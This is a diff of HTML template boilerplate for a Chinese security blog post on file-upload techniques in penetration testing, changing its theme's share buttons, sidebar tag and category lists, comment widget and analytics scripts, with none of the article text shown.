-    <p>记录互联网安全历程与个人成长经历</p>
-</section>
-      <section class="share">
-    <h4>Share this post</h4>
-    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/1134.seo/" target="_blank">
-        <span class="hidden">weibo</span>
-    </a>
-    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/1134.seo/"
-       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
-        <span class="hidden">Twitter</span>
-    </a>
-    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/1134.seo/"
-       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
-        <span class="hidden">Facebook</span>
-    </a>
-    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/1134.seo/"
-       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
-        <span class="hidden">Google+</span>
-    </a>
-</section>
-
-    </footer>
-  </article>
-  <nav class="pagination" role="pagination">
-    
-    <a class="newer-posts" href="/1135.seo/">
-        ← Android APP安全测试入门
-    </a>
-    
-    <span class="icon-logo">•</span>
-    
-    <a class="older-posts" href="/1133.seo/">
-        针对打印机的APT攻击 →
-    </a>
-    
-</nav>
-
-  <div id="comment" class="comments-area">
-    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
-    
-</div>
-
-</main>
-
-
-      
-<footer class="site-footer">
   
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
-  </div>
-</footer>
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+    <span class="jiathis_txt">分享到：</span>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_weixin"></a>
+    <a class="jiathis_button_renren"></a>
+    <a href="http://www.jiathis.com/share?uid=1987046" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+    <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+var jiathis_config = {data_track_clickback:'true'};
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1987046" charset="utf-8"></script>
+<!-- JiaThis Button END -->
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
-
-
-
-  </div>
 </div>
 
-<nav  class="outer-nav top horizontal">
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/category/黑客技巧/">黑客技巧</a>
+</div>
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+  <div class="article-tags">
+  
+  <span></span> <a href="/tag/渗透测试/">渗透测试</a>
+  </div>
 
-          <a class="icon-image"  href="/images"><span>Images</span></a>
 
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/1135.seo/" title="Android APP安全测试入门">
+  <strong>Prev:</strong><br/>
+  <span>
+  Android APP安全测试入门</span>
+</a>
+</div>
 
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
 
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+<div class="next">
+<a href="/1133.seo/"  title="针对打印机的APT攻击">
+ <strong>Next:</strong><br/> 
+ <span>针对打印机的APT攻击
+</span>
+</a>
+</div>
 
 </nav>
 
+	<!-- 多说-->
+
+<section class="comment">
+<div class="ds-thread" data-thread-key="post-渗透测试中上传文件到目标系统的四种姿势" data-title="渗透测试中上传文件到目标系统的四种姿势" data-url="http://ha.cker.in/1134.seo/"></div>
+</section>
+<!-- disqus-->
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  <p class="asidetitle">关注</p>
+<iframe width="100%" height="120" class="share_self" marginheight="5px" frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=120&fansRow=2&ptype=1&speed=0&skin=1&isTitle=1&noborder=1&isWeibo=1&isFans=1&uid=2583230784&verifier=1d07a1a0&dpc=1"></iframe>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+			<li><a href="/category/Linux笔记/" title="Linux笔记">Linux笔记<sup>46</sup></a></li>
+		
+			<li><a href="/category/Web安全/" title="Web安全">Web安全<sup>88</sup></a></li>
+		
+			<li><a href="/category/代码学习/" title="代码学习">代码学习<sup>25</sup></a></li>
+		
+			<li><a href="/category/原创文章/" title="原创文章">原创文章<sup>37</sup></a></li>
+		
+			<li><a href="/category/工具视频/" title="工具视频">工具视频<sup>12</sup></a></li>
+		
+			<li><a href="/category/影音娱乐/" title="影音娱乐">影音娱乐<sup>15</sup></a></li>
+		
+			<li><a href="/category/手机安全/" title="手机安全">手机安全<sup>11</sup></a></li>
+		
+			<li><a href="/category/无线安全/" title="无线安全">无线安全<sup>4</sup></a></li>
+		
+			<li><a href="/category/渗透测试/" title="渗透测试">渗透测试<sup>94</sup></a></li>
+		
+			<li><a href="/category/疑难杂症/" title="疑难杂症">疑难杂症<sup>11</sup></a></li>
+		
+			<li><a href="/category/精品软件/" title="精品软件">精品软件<sup>16</sup></a></li>
+		
+			<li><a href="/category/絮叨碎语/" title="絮叨碎语">絮叨碎语<sup>47</sup></a></li>
+		
+			<li><a href="/category/黑客技巧/" title="黑客技巧">黑客技巧<sup>77</sup></a></li>
+		
+		</ul>
 </div>
-</body>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tag/net/" title=".net">.net<sup>1</sup></a></li>
+		
+			<li><a href="/tag/0day/" title="0day">0day<sup>5</sup></a></li>
+		
+			<li><a href="/tag/12306/" title="12306">12306<sup>3</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂/" title="12306刷票外挂">12306刷票外挂<sup>1</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂下载/" title="12306刷票外挂下载">12306刷票外挂下载<sup>1</sup></a></li>
+		
+			<li><a href="/tag/1521/" title="1521">1521<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3389/" title="3389">3389<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360/" title="360">360<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3600safe/" title="3600safe">3600safe<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360浏览器抢票专版/" title="360浏览器抢票专版">360浏览器抢票专版<sup>1</sup></a></li>
+		
+			<li><a href="/tag/61398/" title="61398">61398<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ACL/" title="ACL">ACL<sup>1</sup></a></li>
+		
+			<li><a href="/tag/APT/" title="APT">APT<sup>3</sup></a></li>
+		
+			<li><a href="/tag/ARP/" title="ARP">ARP<sup>2</sup></a></li>
+		
+			<li><a href="/tag/ASP/" title="ASP">ASP<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ASP中FSO的神奇功能/" title="ASP中FSO的神奇功能">ASP中FSO的神奇功能<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ATM/" title="ATM">ATM<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript中shellcode的定位和提取/" title="ActionScript中shellcode的定位和提取">ActionScript中shellcode的定位和提取<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript的反汇编和反编译/" title="ActionScript的反汇编和反编译">ActionScript的反汇编和反编译<sup>1</sup></a></li>
+		
+			<li><a href="/tag/Acunetix-Web-Vulnerability-Scanner/" title="Acunetix Web Vulnerability Scanner">Acunetix Web Vulnerability Scanner<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+      <li><a href="http://blog.csdn.net/dreajay" target="_blank" title="dreajay csdn">CSDN</a></li>
+      <li><a href="https://github.com/dreajay" target="_blank" title="dreajay github">github</a></li>
+      <li><a href="http://www.douban.com/people/72514701/" target="_blank" title="dreajay豆瓣">豆瓣</a></li>
+    </ul>
+</div>
+
+
+  <div class="rsspart">
+	<a href="atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"dreajaygithubblog"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+</div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
+
+
+  </body>
 </html>
+
